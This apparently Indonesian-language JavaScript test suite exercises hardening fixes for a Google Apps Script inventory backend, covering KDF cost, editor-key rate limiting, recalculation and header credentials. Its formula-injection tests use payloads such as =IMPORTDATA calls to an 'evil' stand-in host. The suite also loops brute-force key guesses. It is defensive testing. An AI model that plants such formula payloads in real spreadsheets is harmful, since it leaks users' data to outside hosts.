/* L1 gs_hardening_exec — RED→GREEN untuk 5 temuan backend yang sebelumnya hanya
 * dicatat sebagai "ACCEPTED LIMITATION" di sec_classify.js. Suite ini MENGEKSEKUSI
 * Code.gs lewat harness dan membuktikan sifatnya, bukan grep.
 *
 *   BE-01  KDF 100.000 iterasi ikut jalan untuk request TANPA kredensial (DoS amplifier)
 *   BE-02  tidak ada rate limit untuk editor key (brute force tanpa batas)
 *   BE-04  recalculateAllSaldo memakai clearContents → pembaca bisa lihat saldo kosong
 *   BE-05  formula-injection guard (safeCell_) tidak dipakai di jalur tulis modul Aset
 *   BE-07  jalur kredensial via header mati (GAS lowercase-kan nama header)
 *
 * Semua test menulis property yang SEHARUSNYA benar.Sebelum fix: FAIL (RED).
 * Level: L1 (offline deterministik, harness in-memory). */
const fs = require('fs');
const path = require('path');
const { loadCodeGS, makeSpreadsheet, makeSheet } = require('../tools/gs_harness.js');

let pass = 0, fail = 0;
function t(name, cond, detail) {
  if (cond) { pass++; console.log('PASS | ' + name + (detail ? ' | ' + detail : '')); }
  else { fail++; console.log('FAIL | ' + name + (detail ? ' | ' + detail : '')); }
}
const EDITOR_KEY = 'RAHASIA-EDITOR-KEY';

function kitchen(editorRows) {
  return makeSpreadsheet([
    makeSheet('Master_Item', [['No', 'ID_Item', 'Nama Material', 'Spesifikasi', 'User/Dept', 'BC/Non BC', 'Unit', 'Kategori', 'Min_Stock', 'Status'], [1, 'MRO-01', 'Bearing', 'Spec', 'Gudang', 'BC', 'Pcs', 'Sparepart', 5, 'Aktif']]),
    makeSheet('Transaksi_Log', [['Timestamp', 'ID_Item', 'Nama_Item', 'Spesifikasi', 'Jenis', 'Qty', 'RAK', 'Vendor', 'No_Referensi', 'Saldo_Sebelum', 'Saldo_Sesudah', 'Keterangan', 'Admin']]),
    makeSheet('Stok_Saldo', [['ID_Item', 'Nama', 'Unit', 'Total_Masuk', 'Total_Keluar', 'Saldo_Akhir']]),
    makeSheet('Stok_Per_Rak', [['ID_Item', 'RAK', 'Qty']]),
    // Editor_Accounts: Nama | EditorKey | Aktif  (kolom tambahan utk uji)
    makeSheet('Editor_Accounts', [['Nama', 'EditorKey', 'Aktif']].concat(editorRows || [])),
    makeSheet('Aset_Item', [['No', 'Kode_Alat', 'Nama_Alat', 'Brand', 'Cutting_Tool', 'Material', 'Spesifikasi', 'Mesin_Default', 'Kode_Mesin_Default', 'Berat_Kg', 'UOM', 'Rak_Penyimpanan', 'Vendor_Asah_Default', 'Rata2_Pemakaian_30Hari', 'Lead_Time_Asah_RatRata', 'Safety_Stock', 'Reorder_Point', 'Min_Stock']]),
    makeSheet('Aset_Unit', [['Unit_ID', 'Kode_Alat', 'Tanggal_Masuk', 'Regrind_Count', 'Status_Unit', 'Lokasi_Saat_Ini', 'Kode_Mesin_Saat_Ini', 'Last_Event', 'Last_Cycle_ID', 'Last_Update']]),
    makeSheet('Aset_Movement_Log', [['Timestamp', 'Kode_Alat', 'Unit_ID', 'ID_Transaksi', 'Activity', 'Qty', 'Cycle_ID', 'Counter', 'Kode_Mesin', 'Vendor', 'PIC', 'Keterangan']]),
    makeSheet('Master_Kategori', [['Kategori']]),
    makeSheet('Master_UOM', [['UOM']]),
    makeSheet('Master_Vendor', [['Vendor']]),
    makeSheet('Master_Rak', [['Rak']]),
  ]);
}
function ctxFor(kit, kdf) {
  return loadCodeGS({ spreadsheet: kit, kdfIterations: kdf || 100, props: { EDITOR_KEY: EDITOR_KEY, VIEWER_TOKEN_SECRET: 'S' } });
}
// hitung berapa kali KDF (verifyPasswordHash_) dijalankan — DILAKUKAN untuk membuktikan BE-01.
// Hanya bungkus entry point KDF; jangan bungkus hashPasswordHex_ (mem riddled recursion).
function countKdfCalls(ctx) {
  const orig = ctx.verifyPasswordHash_;
  let n = 0;
  ctx.verifyPasswordHash_ = function () { n++; return orig.apply(this, arguments); };
  return () => n;
}

/* ================= BE-01: KDF jalan tanpa kredensial ================= */
(function () {
  const ctx0 = ctxFor(kitchen([['Admin', ctxFor(kitchen()).makeSaltedPasswordHash_('editor-pass-1'), true], ['Admin2', ctxFor(kitchen()).makeSaltedPasswordHash_('editor-pass-2'), true]]));
  const kit = kitchen([['Admin', ctx0.makeSaltedPasswordHash_('editor-pass-1'), true], ['Admin2', ctx0.makeSaltedPasswordHash_('editor-pass-2'), true]]);
  const ctx = ctxFor(kit);
  const c = countKdfCalls(ctx);
  // request baca TANPA kredensial (skenario viewer/anonim) — tidak seharusnya hashing sama sekali
  const res = ctx.checkAnyAccess({});
  const n = c();
  t('BE-01: request baca tanpa kredensial TIDAK menjalankan KDF password', n === 0, 'KDF dijalankan ' + n + '× untuk 1 request tanpa kredensial');
  // sanity: dengan editorKey salah → memang harus hashing (membandingkan)
  const ctx2 = ctxFor(kitchen([['Admin', ctx0.makeSaltedPasswordHash_('editor-pass-1'), true]]));
  const c2 = countKdfCalls(ctx2);
  ctx2.checkAnyAccess({ editorKey: 'SALAH-SEKALI' });
  t('BE-01b: dengan editorKey yang salah KDF tetap jalan (proteksi aktif)', c2() > 0, 'KDF dijalankan ' + c2() + '×');
})();

/* ================= BE-02: rate limit editor key ================= */
(function () {
  // mode 1: satu kunci salah diulang-ulang (hammer satu target)
  const ctx = ctxFor(kitchen([])); // tanpa Editor_Accounts → jatuh ke EDITOR_KEY tunggal
  let rejectedAt = -1;
  for (let i = 1; i <= 20; i++) {
    const r = ctx.checkEditorKey({ editorKey: 'TEBAKAN-SAMA' });
    if (r && r.ok === false && /terlalu banyak|limit|banyak percobaan/i.test(r.message || '')) { rejectedAt = i; break; }
  }
  t('BE-02a: kunci salah yang diulang dihentikan (rate limit per-kunci)', rejectedAt > 0,
    rejectedAt > 0 ? 'ditolak pada percobaan ke-' + rejectedAt : 'TIDAK ADA rate limit');

  // mode 2: tebukan ACAK (setiap kunci berbeda) — inilah brute force sungguhan,
  // harus dihentikan oleh penghitung GLOBAL (per-kunci saja tidak cukup)
  const ctx2 = ctxFor(kitchen([]));
  let rejectedAt2 = -1;
  for (let i = 1; i <= 60; i++) {
    const r = ctx2.checkEditorKey({ editorKey: 'ACAK-' + i + '-' + Math.random() });
    if (r && r.ok === false && /terlalu banyak|limit|banyak percobaan/i.test(r.message || '')) { rejectedAt2 = i; break; }
  }
  t('BE-02b: tebakan acak dihentikan (rate limit global)', rejectedAt2 > 0,
    rejectedAt2 > 0 ? 'dihentikan setelah ' + rejectedAt2 + ' tebakan' : 'TIDAK ADA rate limit global');
})();

(function () {
  const ctx = ctxFor(kitchen([]));
  for (let i = 0; i < 5; i++) ctx.checkEditorKey({ editorKey: 'SALAH-SEKALI' });
  t('BE-02c: editor key benar tetap bisa dipakai setelah ada percobaan salah',
    ctx.checkEditorKey({ editorKey: EDITOR_KEY }).ok === true, 'kunci sah tetap valid');
})();

/* ================= BE-04: recalc tidak boleh mengosongkan sheet ================= */
(function () {
  const kit = kitchen([]);
  const ctx = ctxFor(kit);
  ctx.postTransaksi({ itemId: 'MRO-01', jenis: 'MASUK', qty: 10, rak: 'A-01', admin: 'b', requestId: 'h1' });
  ctx.postTransaksi({ itemId: 'MRO-01', jenis: 'MASUK', qty: 7, rak: 'B-01', admin: 'b', requestId: 'h2' });
  // intsruksi: catat setiap panggilan clearContents pada sheet saldo
  const calls = [];
  ['Stok_Saldo', 'Stok_Per_Rak'].forEach(name => {
    const sh = kit.getSheetByName(name);
    const orig = sh.clearContents;
    sh.clearContents = function () { calls.push(name); return orig.apply(this, arguments); };
  });
  ctx.recalculateAllSaldoLocked_();
  t('BE-04: kalkulasi ulang TIDAK mengosongkan sheet saldo (reader tak pernah lihat kosong)', calls.length === 0,
    calls.length ? 'clearContents dipanggil pada: ' + calls.join(',') : 'tidak ada clearContents');
  const saldo = kit.getSheetByName('Stok_Saldo').getRange(2, 1, kit.getSheetByName('Stok_Saldo').getLastRow() - 1, 6).getValues();
  t('BE-04b: hasil kalkulasi tetap benar (MRO-01 = 17)', saldo.length === 1 && Number(saldo[0][5]) === 17, JSON.stringify(saldo));
})();

/* ================= BE-05: formula guard di jalur tulis Aset ================= */
(function () {
  const ctx0 = ctxFor(kitchen([]));
  const kit = kitchen([]);
  const ctx = ctxFor(kit);
  ctx.addAsetItem({ kodeAlat: 'PAHAT-01', namaAlat: '=IMPORTDATA("http://evil/leak")', pic: 'budi' });
  ctx.addMasterValue({ type: 'kategori', value: '=IMPORTDATA("http://evil/leak2")' });
  const itemName = (kit.getSheetByName('Aset_Item').getRange(2, 3, 1, 1).getValues()[0] || [])[0];
  const kat = (kit.getSheetByName('Master_Kategori').getRange(2, 1, 1, 1).getValues()[0] || [])[0];
  t('BE-05: namaAlat berawalan "=" dinetralkan (prefix kutip)', typeof itemName === 'string' && itemName.charAt(0) === "'", JSON.stringify(itemName));
  t('BE-05b: addMasterValue berawalan "=" dinetralkan', typeof kat === 'string' && kat.charAt(0) === "'", JSON.stringify(kat));
  // unit + movement log juga harus terlindungi
  ctx.addAsetUnit({ kodeAlat: 'PAHAT-01', jumlah: 1, pic: 'b' });
  const unitId = kit.getSheetByName('Aset_Unit').getRange(2, 1, 1, 1).getValues()[0][0];
  ctx.recordAsetMovement({ unitId: unitId, activity: 'DIPASANG_KE_MESIN', pic: 'b', kodeMesin: '=CMD()' });
  const log = kit.getSheetByName('Aset_Movement_Log').getRange(2, 1, kit.getSheetByName('Aset_Movement_Log').getLastRow() - 1, 12).getValues();
  const kodeMesin = log[log.length - 1][8];
  t('BE-05c: kodeMesin berawalan "=" di movement log dinetralkan', typeof kodeMesin === 'string' && kodeMesin.charAt(0) === "'", JSON.stringify(kodeMesin));
})();

/* ================= BE-07: kredensial via header (GAS lowercase) ================= */
(function () {
  const ctx = ctxFor(kitchen([]));
  let out;
  try {
    out = ctx.doGet({ parameter: { action: 'getMasterLists' }, allHeaders: { 'x-editor-key': EDITOR_KEY } });
  } catch (e) {
    t('BE-07: doGet menerima editor key lewat header (GAS lowercase-kan nama header)', false, 'error: ' + e.message);
    out = null;
  }
  if (out) {
    let parsed = null;
    try { parsed = JSON.parse(out._t || out.getContent && out.getContent() || '{}'); } catch (e) { parsed = null; }
    const needLogin = parsed && parsed.needLogin === true;
    t('BE-07: doGet menerima editor key lewat header (GAS lowercase-kan nama header)', !needLogin,
      'status=' + (parsed && parsed.status) + ' needLogin=' + needLogin);
  }
})();

console.log('---- gs_hardening_exec: ' + pass + ' PASS / ' + fail + ' FAIL ----');
process.exit(fail ? 1 : 0);
